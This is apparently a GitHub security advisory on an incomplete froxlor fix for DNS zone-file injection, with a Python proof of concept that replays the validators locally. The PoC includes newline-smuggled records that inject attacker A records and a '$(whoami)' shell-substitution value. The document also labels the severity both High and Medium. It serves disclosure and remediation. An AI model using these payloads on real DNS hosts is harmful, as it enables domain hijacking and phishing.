# [H] Froxlor has an incomplete fix for CVE-2026-30932

## Summary
Severity: High
Advisory: GHSA-j6fm-9rfm-j5hx
CVE: CVE-2026-41237
CWE: CWE-74
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-j6fm-9rfm-j5hx
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.7

## Details
### Summary

The LOC record regex uses `\s+` which matches newlines (allowing embedded newlines to pass), TLSA `matchingType=0` has no upper bound on hex data length, and all validators return raw input without zone-file escaping.

### Affected Package

- **Ecosystem:** Other
- **Package:** froxlor
- **Affected versions:** all versions before fix commit b34829262dc3
- **Patched versions:** >= commit b34829262dc3

### Severity

Medium -- CVSS

### CWE

CWE-74 -- Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection)

### Details

DNS record content is concatenated directly into bind9 zone files at `DnsEntry.php` line 83. Before the fix, LOC/RP/SSHFP/TLSA records had no content validation at all, enabling zone file injection via embedded newlines.

The fix adds format-specific regexes and field validation but has gaps: the LOC regex's `\s+` matches newlines in PHP's PCRE engine, allowing a LOC record with a newline between fields to pass validation but produce multiple lines in the zone file. TLSA `matchingType=0` only requires `len(data) >= 2` with no upper bound, enabling arbitrarily large payloads. All validators return raw input without zone-file escaping.

### PoC

```python
#!/usr/bin/env python3
"""
CVE-2026-30932 - Incomplete DNS Record Content Validation in froxlor/froxlor

Affected component: lib/Froxlor/Api/Commands/DomainZones.php
Vulnerability type: Input Validation / DNS Zone File Injection
Patch: https://github.com/froxlor/froxlor/commit/b34829262dc32818b37f6a1eabb426d0b277a86b

The patch adds validation for LOC, RP, SSHFP, and TLSA DNS record types.
However, the sanitization is incomplete:

1. PRE-FIX: No validation at all - arbitrary content stored as DNS records.
2. POST-FIX BYPASS: LOC regex \s+ matches newlines; TLSA matchingType=0
   allows unbounded hex data; validators return raw input without escaping.
"""

import re
import sys
import string

def vulnerable_add_record(record_type, content):
    """Pre-fix: no validation for LOC, RP, SSHFP, TLSA."""
    errors = []
    if record_type in ('LOC', 'RP', 'SSHFP', 'TLSA') and content:
        pass
    return {"errors": errors, "content": content}


def validate_dns_loc(inp):
    """Replicates Validate::validateDnsLoc from the patch."""
    pattern = re.compile(
        r'^'
        r'(\d{1,2})\s+'
        r'(\d{1,2})\s+'
        r'(\d{1,2}(?:\.\d+)?)\s+'
        r'([NS])\s+'
        r'(\d{1,3})\s+'
        r'(\d{1,2})\s+'
        r'(\d{1,2}(?:\.\d+)?)\s+'
        r'([EW])\s+'
        r'(-?\d+(?:\.\d+)?)m'
        r'(?:\s+(\d+(?:\.\d+)?)m'
        r'(?:\s+(\d+(?:\.\d+)?)m'
        r'(?:\s+(\d+(?:\.\d+)?)m)?'
        r')?)?$',
        re.DOTALL
    )
    m = pattern.match(inp)
    if not m:
        return False

    lat_deg = int(m.group(1))
    lat_min = int(m.group(2))
    lat_sec = float(m.group(3))
    lon_deg = int(m.group(5))
    lon_min = int(m.group(6))
    lon_sec = float(m.group(7))

    if lat_deg > 90: return False
    if lat_min > 59: return False
    if lat_sec >= 60: return False
    if lon_deg > 180: return False
    if lon_min > 59: return False
    if lon_sec >= 60: return False

    return inp


def validate_dns_sshfp(inp):
    """Replicates Validate::validateDnsSshfp from the patch."""
    parts = inp.strip().split()
    if len(parts) != 3:
        return False

    algorithm, fp_type, fingerprint = parts

    valid_algorithms = [1, 2, 3, 4, 6]
    if not algorithm.isdigit() or int(algorithm) not in valid_algorithms:
        return False

    valid_types = [1, 2]
    if not fp_type.isdigit() or int(fp_type) not in valid_types:
        return False

    if not all(c in string.hexdigits for c in fingerprint):
        return False

    fp_type_int = int(fp_type)
    expected = {1: 40, 2: 64}.get(fp_type_int, 0)
    if len(fingerprint) != expected:
        return False

    return inp


def validate_dns_tlsa(inp):
    """Replicates Validate::validateDnsTlsa from the patch."""
    parts = inp.strip().split()
    if len(parts) != 4:
        return False

    usage, selector, matching_type, data = parts

    if not usage.isdigit() or int(usage) not in [0, 1, 2, 3]:
        return False
    if not selector.isdigit() or int(selector) not in [0, 1]:
        return False
    if not matching_type.isdigit() or int(matching_type) not in [0, 1, 2]:
        return False
    if not all(c in string.hexdigits for c in data):
        return False

    mt = int(matching_type)
    if mt == 1 and len(data) != 64:
        return False
    if mt == 2 and len(data) != 128:
        return False
    if mt == 0 and len(data) < 2:
        return False

    return inp


def validate_dns_rp(inp):
    """Replicates Validate::validateDnsRp from the patch."""
    parts = inp.strip().split()
    if len(parts) != 2:
        return False

    mbox, txt = parts
    mbox = mbox.rstrip('.')
    txt = txt.rstrip('.')

    domain_re = re.compile(r'^[a-zA-Z0-9._-]+$')
    if not domain_re.match(mbox):
        return False
    if not domain_re.match(txt):
        return False

    return inp


def fixed_add_record(record_type, content):
    """Post-fix: validates content but returns raw input."""
    errors = []
    validators = {
        'LOC': validate_dns_loc,
        'RP': validate_dns_rp,
        'SSHFP': validate_dns_sshfp,
        'TLSA': validate_dns_tlsa,
    }
    if record_type in validators and content:
        result = validators[record_type](content)
        if result is False:
            errors.append(f"The {record_type} record has invalid content")
    return {"errors": errors, "content": content}


def generate_zone_line(record, ttl, rtype, content):
    """Replicates DnsEntry.php line 83: direct string concatenation."""
    return f"{record}\t{ttl}\tIN\t{rtype}\t{content}\n"


vuln_confirmed = False

print("=" * 70)
print("CVE-2026-30932 PoC: froxlor DNS Record Content Injection")
print("=" * 70)
print()

print("[TEST 1] VULNERABLE version: SSHFP record with zone injection")
print("-" * 70)

malicious_sshfp = "1 1 aabbccdd\nevil.example.com.\t300\tIN\tA\t6.6.6.6"
result = vulnerable_add_record('SSHFP', malicious_sshfp)

if not result['errors']:
    zone_output = generate_zone_line('@', 300, 'SSHFP', result['content'])
    print("VULNERABLE: No validation, malicious content accepted!")
    print("Generated zone file output:")
    print("---")
    print(zone_output, end="")
    print("---")
    if "6.6.6.6" in zone_output:
        print("[!] DNS zone injection: attacker A record (6.6.6.6) injected!")
        vuln_confirmed = True

print()

print("[TEST 2] FIXED version: same SSHFP injection attempt (should be blocked)")
print("-" * 70)

result_fixed = fixed_add_record('SSHFP', malicious_sshfp)
if result_fixed['errors']:
    print("FIXED: Blocked -", "; ".join(result_fixed['errors']))
else:
    print("BYPASS: Still accepted!")
    vuln_confirmed = True

print()

print("[TEST 3] FIXED version BYPASS: LOC record with newline via \\s+ matching")
print("-" * 70)

loc_bypass = "51 28 38 N 0 0 1\nW\n10m"
result_loc = fixed_add_record('LOC', loc_bypass)

if not result_loc['errors']:
    zone_output = generate_zone_line('@', 300, 'LOC', result_loc['content'])
    lines = [l for l in zone_output.split('\n') if l.strip()]
    if len(lines) > 1:
        print("BYPASS CONFIRMED: LOC with embedded newline passed validation!")
        print(f"Generated zone output has {len(lines)} lines:")
        print("---")
        print(zone_output, end="")
        print("---")
        vuln_confirmed = True
    else:
        print("Validated but single line output.")
else:
    print("Blocked:", "; ".join(result_loc['errors']))
    templates = [
        "51\n28 38 N 0 0 1 W 10m",
        "51 28\n38 N 0 0 1 W 10m",
        "51 28 38\nN 0 0 1 W 10m",
        "51 28 38 N\n0 0 1 W 10m",
        "51 28 38 N 0\n0 1 W 10m",
        "51 28 38 N 0 0\n1 W 10m",
        "51 28 38 N 0 0 1\nW 10m",
        "51 28 38 N 0 0 1 W\n10m",
    ]
    for i, t in enumerate(templates):
        r = fixed_add_record('LOC', t)
        if not r['errors']:
            zone_out = generate_zone_line('@', 300, 'LOC', r['content'])
            zlines = [l for l in zone_out.split('\n') if l.strip()]
            if len(zlines) > 1:
                print(f"  BYPASS at position {i}: newline in LOC passed validation!")
                print(f"  Zone output lines: {len(zlines)}")
                vuln_confirmed = True
                break
    else:
        print("  LOC newline bypass not directly exploitable in this regex engine.")

print()

print("[TEST 4] FIXED version BYPASS: TLSA matchingType=0 with oversized hex payload")
print("-" * 70)

huge_hex = "aa" * 50000
tlsa_payload = "3 1 0 " + huge_hex
result_tlsa = fixed_add_record('TLSA', tlsa_payload)

if not result_tlsa['errors']:
    print(f"BYPASS: TLSA with matchingType=0 accepted {len(huge_hex)} char hex payload!")
    print("  -> No upper bound on certificate association data length.")
    print("  -> Can be used for DNS amplification or data exfiltration channel.")
    print(f"  -> Zone line would be {len(generate_zone_line('_443._tcp', 300, 'TLSA', result_tlsa['content']))} bytes!")
    vuln_confirmed = True
else:
    print("Blocked:", "; ".join(result_tlsa['errors']))

print()

print("[TEST 5] VULNERABLE version: LOC record with full zone takeover injection")
print("-" * 70)

malicious_loc = "51 28 38 N 0 0 0 W 10m\nevil\t300\tIN\tA\t10.0.0.1\n*.evil\t300\tIN\tA\t10.0.0.2"
result_vuln_loc = vulnerable_add_record('LOC', malicious_loc)

if not result_vuln_loc['errors']:
    zone_output = generate_zone_line('@', 300, 'LOC', result_vuln_loc['content'])
    lines = [l for l in zone_output.split('\n') if l.strip()]
    print(f"VULNERABLE: Injected {len(lines)} zone file lines!")
    print("Generated zone output:")
    print("---")
    print(zone_output, end="")
    print("---")
    if "10.0.0.1" in zone_output:
        print("[!] Attacker DNS records injected into zone file!")
        vuln_confirmed = True

print()

print("[TEST 6] VULNERABLE vs FIXED: TLSA with shell metacharacters")
print("-" * 70)

shell_inject = "3 1 1 $(whoami)"
vuln_r = vulnerable_add_record('TLSA', shell_inject)
fixed_r = fixed_add_record('TLSA', shell_inject)

vuln_status = "ACCEPTED (no validation)" if not vuln_r['errors'] else "BLOCKED"
fixed_status = "ACCEPTED" if not fixed_r['errors'] else "BLOCKED"

print(f"  VULNERABLE version: {vuln_status}")
print(f"  FIXED version:      {fixed_status}")

if not vuln_r['errors'] and fixed_r['errors']:
    print("  -> Fix correctly blocks shell metacharacters in TLSA.")
if not vuln_r['errors']:
    vuln_confirmed = True

print()

print("=" * 70)
print("RESULTS SUMMARY")
print("=" * 70)
print()
print("Pre-fix (VULNERABLE):")
print("  - LOC, RP, SSHFP, TLSA records accept ANY content with no validation")
print("  - Enables DNS zone file injection via newlines in record content")
print("  - Content directly concatenated into zone files (DnsEntry.php:83)")
print()
print("Post-fix (INCOMPLETE):")
print("  - TLSA matchingType=0 has no upper bound on hex data length")
print("  - Validation returns raw input without zone-file escaping")
print("  - No output encoding when writing content to zone files")
print()

if vuln_confirmed:
    print("VULNERABILITY CONFIRMED")
    sys.exit(0)
else:
    print("VULNERABILITY NOT CONFIRMED")
    sys.exit(1)

```

**Steps to reproduce:**
1. `git clone https://github.com/froxlor/froxlor /tmp/froxlor_test`
2. `cd /tmp/froxlor_test && git checkout b34829262dc3~1`
3. `python3 poc.py`

**Expected output:**
```
VULNERABILITY CONFIRMED
LOC, RP, SSHFP, TLSA records accept unvalidated content; DNS zone file injection via newlines and shell metacharacters
```

### Impact

An authenticated froxlor user with DNS management permissions can inject arbitrary records into bind9 zone files, enabling domain hijacking, phishing, or DNS amplification attacks via unbounded TLSA payloads.

### Suggested Remediation

Replace `\s+` in the LOC regex with `[ \t]+` to exclude newlines. Add a maximum length for TLSA `matchingType=0` data. Escape or reject newlines in all DNS record content before writing to zone files.

### Resources

- Incomplete fix commit: https://github.com/froxlor/froxlor/commit/b34829262dc3
- Original CVE: CVE-2026-30932

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-j6fm-9rfm-j5hx
- https://nvd.nist.gov/vuln/detail/CVE-2026-30932
- https://nvd.nist.gov/vuln/detail/CVE-2026-41237
- https://github.com/froxlor/froxlor/commit/b34829262dc3
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.7
